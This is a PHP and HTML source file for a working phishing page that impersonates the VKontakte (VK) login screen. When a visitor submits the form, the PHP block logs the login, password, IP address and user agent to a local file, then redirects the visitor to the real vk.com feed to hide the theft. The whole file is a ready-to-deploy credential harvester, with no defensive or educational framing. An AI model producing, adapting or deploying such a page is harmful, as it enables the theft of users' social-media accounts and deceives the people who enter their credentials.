<?php
$log_dir = '../logs/vk';
if (!file_exists($log_dir)) mkdir($log_dir, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $entry = "════════════════════════════════════════════════\n";
    $entry .= "TIME: " . date('Y-m-d H:i:s') . "\n";
    $entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $entry .= "USER-AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $entry .= "LOGIN: $login\n";
    $entry .= "PASSWORD: $password\n";
    $entry .= "════════════════════════════════════════════════\n\n";
    
    file_put_contents("$log_dir/vk.log", $entry, FILE_APPEND | LOCK_EX);
    header('Location: https://vk.com/feed');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VK • Official</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #edeef0; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: white; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: #0077ff; color: white; padding: 24px; text-align: center; }
        .header h1 { font-size: 24px; font-weight: 600; margin-bottom: 4px; }
        .header p { font-size: 14px; opacity: 0.9; }
        .content { padding: 24px; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 14px; border: 2px solid #e1e3e6; border-radius: 8px; font-size: 15px; }
        .form-group input:focus { outline: none; border-color: #0077ff; }
        .btn { width: 100%; padding: 14px; background: #0077ff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #0066dd; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>ВКонтакте</h1>
                <p>Official Account</p>
            </div>
            <div class="content">
                <form method="POST">
                    <div class="form-group">
                        <input type="text" name="login" placeholder="Phone or email" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="btn">Log in</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
